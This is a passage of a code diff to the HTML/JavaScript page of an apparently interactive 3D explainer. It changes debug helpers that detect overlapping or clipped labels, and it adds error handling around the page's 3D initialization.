   autorun: v => { if (v !== undefined) setAutorun(v); return autorunOn; }, // Reads the auto-play state. If a value is given, changes it (and saves it) and returns the new state
@@ -1782,7 +1871,7 @@ window.__explainer = {
     return resultFor(name)?.textContent ?? '';
   },
   overlaps(minArea = 24) {
-    const boxes = allTags
+    const boxes = [...allTags]
       .filter(o => o.visible && o.element.isConnected && o.element.style.display !== 'none' && parseFloat(o.element.style.opacity || '1') > 0.5)
       .map(o => ({ text: o.element.textContent, r: o.element.getBoundingClientRect() }))
       .filter(b => b.r.width > 0);
@@ -1799,7 +1888,7 @@ window.__explainer = {
   },
   clipped() {
     const s = wrap.getBoundingClientRect(); // On phones the canvas cell (title bar and legend bar excluded) is the reference. On desktop it equals the stage.
-    return allTags
+    return [...allTags]
       .filter(o => o.visible && o.element.isConnected && o.element.style.display !== 'none' && parseFloat(o.element.style.opacity || '1') > 0.5)
       .map(o => ({ text: o.element.textContent, r: o.element.getBoundingClientRect() }))
       .filter(b => b.r.width > 0 && (b.r.left < s.left || b.r.right > s.right || b.r.top < s.top || b.r.bottom > s.bottom))
@@ -1812,6 +1901,12 @@ homeCamera(scenes[first]);
 resize();
 activate(first);
 loop();
+setStageState('ready');
+} catch (error) {
+  delete window.__explainer;
+  setStageState('failed', failureMessage);
+  console.error('[plz] 3D initialization failed:', error);
+}
 </script>
 </body>
 </html>
